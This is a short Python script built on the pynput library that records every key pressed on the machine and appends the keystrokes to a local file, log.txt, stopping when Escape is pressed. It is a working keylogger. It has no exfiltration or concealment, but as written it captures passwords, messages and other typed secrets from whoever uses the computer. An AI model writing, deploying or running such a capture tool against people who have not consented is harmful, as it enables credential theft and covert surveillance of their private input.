from pynput.keyboard import Listener
import sys

def addtofile(key):
    keydata = str(key).replace("'", "")  # Remove quotes around the key
    try:
        with open("log.txt", 'a') as f:
           
            if keydata == 'Key.space':
                f.write(' ')
            
            elif keydata == 'Key.enter':
                f.write('\n')
           
            elif keydata == 'Key.esc':
                sys.exit()  
           
            elif keydata.startswith("Key"):
                f.write(' [' + keydata + '] ')
            else:
                f.write(keydata)
    except Exception as e:
        print(f"Error writing to file: {e}")


with Listener(on_press=addtofile) as listener:
    listener.join()
